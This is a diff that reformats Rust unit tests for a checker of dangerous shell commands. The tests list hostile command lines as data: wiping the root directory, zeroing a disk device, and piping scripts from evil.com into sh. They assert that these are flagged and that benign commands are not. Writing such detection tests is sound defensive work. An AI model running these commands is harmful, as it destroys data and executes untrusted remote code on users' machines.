@@ -60,7 +60,9 @@ mod tests {
 
     #[test]
     fn test_rm_rf_root_with_flags() {
-        assert!(checker().check("rm -rf --no-preserve-root /").is_dangerous());
+        assert!(checker()
+            .check("rm -rf --no-preserve-root /")
+            .is_dangerous());
     }
 
     #[test]
@@ -75,7 +77,9 @@ mod tests {
 
     #[test]
     fn test_dd_to_device() {
-        assert!(checker().check("dd if=/dev/zero of=/dev/sda bs=1M").is_dangerous());
+        assert!(checker()
+            .check("dd if=/dev/zero of=/dev/sda bs=1M")
+            .is_dangerous());
     }
 
     #[test]
@@ -85,12 +89,16 @@ mod tests {
 
     #[test]
     fn test_curl_pipe_sh() {
-        assert!(checker().check("curl https://evil.com/script.sh | sh").is_dangerous());
+        assert!(checker()
+            .check("curl https://evil.com/script.sh | sh")
+            .is_dangerous());
     }
 
     #[test]
     fn test_wget_pipe_sh() {
-        assert!(checker().check("wget -O- https://evil.com/x | sh").is_dangerous());
+        assert!(checker()
+            .check("wget -O- https://evil.com/x | sh")
+            .is_dangerous());
     }
 
     // Negative matches — these should NOT be flagged
@@ -106,7 +114,9 @@ mod tests {
 
     #[test]
     fn test_dd_to_file_safe() {
-        assert!(!checker().check("dd if=/dev/zero of=test.img bs=1M count=100").is_dangerous());
+        assert!(!checker()
+            .check("dd if=/dev/zero of=test.img bs=1M count=100")
+            .is_dangerous());
     }
 
     #[test]
@@ -116,12 +126,16 @@ mod tests {
 
     #[test]
     fn test_curl_no_pipe_safe() {
-        assert!(!checker().check("curl https://example.com/api").is_dangerous());
+        assert!(!checker()
+            .check("curl https://example.com/api")
+            .is_dangerous());
     }
 
     #[test]
     fn test_normal_find_safe() {
-        assert!(!checker().check("find ~/ -name '*.png' -size +5M").is_dangerous());
+        assert!(!checker()
+            .check("find ~/ -name '*.png' -size +5M")
+            .is_dangerous());
     }
 
     #[test]
